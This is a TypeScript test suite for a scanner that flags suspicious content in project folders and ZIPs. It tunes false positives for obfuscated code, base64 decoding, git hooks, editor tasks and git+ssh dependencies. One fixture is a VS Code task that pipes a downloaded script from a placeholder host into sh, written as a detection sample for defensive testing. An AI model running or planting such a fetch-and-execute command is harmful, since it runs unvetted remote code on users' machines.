import { describe, expect, it } from "vitest";
import { scanFiles, type ScannedFile } from "../src/index.js";

const file = (path: string, content: string): ScannedFile => ({ path, content, size: content.length, isBinary: false, isSymlink: false });
const scan = (files: ScannedFile[], source: "folder" | "zip" = "folder") => scanFiles(files, source, "mem");

describe("false-positive tuning", () => {
  it("ignores eval() mentioned inside a string", () => {
    const r = scan([file("src/tips.ts", `const tips = { S307: 'Replace eval() with ast.literal_eval() for fetch( results' };`)]);
    expect(r.findings).toEqual([]);
  });

  it("ignores long data lines without obfuscator fingerprints", () => {
    const r = scan([file("lib/data.js", `const M = new Map([${Array.from({ length: 400 }, (_, i) => `["k${i}",${i}]`).join(",")}]);`)]);
    expect(r.findings).toEqual([]);
  });

  it("flags long packed lines with obfuscator fingerprints", () => {
    const packed = `var _0x1a2b=['\\x68\\x65\\x6c\\x6c\\x6f'];` + "(function(_0x3c4d,_0x5e6f){_0x3c4d.push(_0x5e6f);})".repeat(60);
    const r = scan([file("src/index.js", packed)]);
    expect(r.findings[0]).toMatchObject({ ruleId: "obfuscated-code", severity: "suspicious", line: 1 });
  });

  it("flags a base64 blob only when the file decodes something", () => {
    const blob = "QUJD".repeat(100);
    expect(scan([file("src/a.js", `const x = "${blob}";`)]).findings).toEqual([]);
    expect(scan([file("src/a.js", `const x = "${blob}";\nconst y = Buffer.from(x, "base64");`)]).findings).toHaveLength(1);
  });

  it("ignores base64 images", () => {
    const png = "iVBORw0KGgo" + "A".repeat(400);
    expect(scan([file("src/a.js", `const img = "${png}"; atob(img);`)]).findings).toEqual([]);
  });

  it("git hooks: dangerous in a ZIP, suspicious in a local folder, ignored for git-lfs", () => {
    const hook = file(".git/hooks/pre-commit", "#!/bin/sh\necho hello\n");
    expect(scan([hook], "zip").findings[0]!.severity).toBe("dangerous");
    expect(scan([hook], "folder").findings[0]!.severity).toBe("suspicious");
    const lfs = file(".git/hooks/post-checkout", `#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 "missing git-lfs"; exit 2; }\ngit lfs post-checkout "$@"\n`);
    expect(scan([lfs], "zip").findings).toEqual([]);
  });

  it("manual tasks are only flagged for strong signals", () => {
    const tasks = (cmd: string) => file(".vscode/tasks.json", JSON.stringify({ tasks: [{ label: "x", command: cmd }] }));
    expect(scan([tasks("powershell -File build.ps1")]).findings).toEqual([]);
    expect(scan([tasks("curl https://example.invalid/x | sh")]).findings).toHaveLength(1);
  });

  it("dependencies in test fixtures are ignored", () => {
    const pkg = JSON.stringify({ dependencies: { a: "git+ssh://git@example.invalid/a.git" } });
    expect(scan([file("test/cases/x/package.json", pkg)]).findings).toEqual([]);
    expect(scan([file("package.json", pkg)]).findings).toHaveLength(1);
  });
});
